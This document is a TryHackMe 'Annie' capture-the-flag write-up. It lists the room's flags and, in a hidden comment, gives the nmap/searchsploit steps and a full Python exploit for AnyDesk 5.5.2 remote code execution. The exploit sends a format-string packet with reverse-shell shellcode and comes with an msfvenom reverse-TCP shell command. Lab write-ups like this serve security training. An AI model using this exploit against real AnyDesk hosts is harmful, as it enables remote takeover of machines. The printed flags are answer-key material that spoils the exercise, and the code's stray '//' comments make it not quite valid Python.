# <div align="center">[Annie](https://tryhackme.com/r/room/annie)</div>
## <div align="center">   Linux ● Medium </div>
<div align="center">
  <img src="https://tryhackme-images.s3.amazonaws.com/room-icons/9bcbd71d6ed380bcbf41c10cce8ccfcd.png" height="200"></img>
</div>

## Task 1. Recon - Research - Exploit

Do your usual recon, go for some vulnerability research, and exploit this box already.
Also, don't forget the PrivEsc of course :)

Good luck & have fun!

## What is user.txt?
```
THM{N0t_ ju5t_ANY_D3sk}
```

## What is root.txt?
```
THM{0nly_ th3m_5.5.2_D3sk}
```
<!--
# Let start with Scanning the target:
```
nmap -sC -sV
```
## SSL Enumeration
```
openssl s_client -connect 10.10.10.10:7070
```
## Anydesk is Running on port 7070, let serch for any Exploit
```
searchsploit anydesk
```
## Here is the Exploit:
```
# Exploit Title: AnyDesk 5.5.2 - Remote Code Execution
# Date: 09/06/20
# Exploit Author: scryh
# Vendor Homepage: https://anydesk.com/en
# Version: 5.5.2
# Tested on: Linux
# Walkthrough: https://devel0pment.de/?p=1881
import struct
import socket

## Note changes have been made from the original exploit

ip = '10.10.29.248'// Change This
port = 50001 // No Need To Change This Since Anydesk uses UDP ports for screensharing purposes

def gen_discover_packet(ad_id, os, hn, user, inf, func):
    d  = b'\x3e\xd1\x01'
    d += struct.pack('>I', ad_id)
    d += struct.pack('>I', 0)
    d += b'\x02' + bytes([os])
    d += struct.pack('>I', len(hn)) + hn
    d += struct.pack('>I', len(user)) + user
    d += struct.pack('>I', 0)
    d += struct.pack('>I', len(inf)) + inf
    d += b'\x00'
    d += struct.pack('>I', len(func)) + func
    d += b'\x02\xc3\x51'
    return d

# msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.y.y LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
shellcode =  b"" // Make sure to generate the msfvenom reverse shell payload and replace the shellcode below 
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\x39\xe2\xbf"
shellcode += b"\x91\x75\x37\x67\xa8\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\x53\xcb\xe7\x08\x1f"
shellcode += b"\x35\x38\xc2\x38\xbc\xb0\x94\x3d\xa0\x2f\x11"
shellcode += b"\x3b\xe2\xae\xcd\x7f\x3a\x79\xad\x68\xaa\x36"
shellcode += b"\x77\x1f\x27\x3d\xc2\x13\xba\xb0\x94\x1f\x34"
shellcode += b"\x39\xe0\xc6\x2c\xd5\xb0\x2d\x38\x62\xdd\xcf"
shellcode += b"\x88\x84\xc9\xec\x7f\xdc\x87\x5b\x8b\xd1\xbe"
shellcode += b"\x06\x5f\x67\xfb\x71\x6b\x58\xc3\x22\x7f\xee"
shellcode += b"\x4e\x36\xe7\xbf\x91\x75\x37\x67\xa8"

print('sending payload ...')
p = gen_discover_packet(4919, 1, b'\x85\xfe%1$*1$x%18x%165$ln' + shellcode, b'\x85\xfe%18472249x%93$ln', b'ad', b'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()

print('reverse shell should connect within 5 seconds')
```

## Creating shell code 
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.y.y LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
```
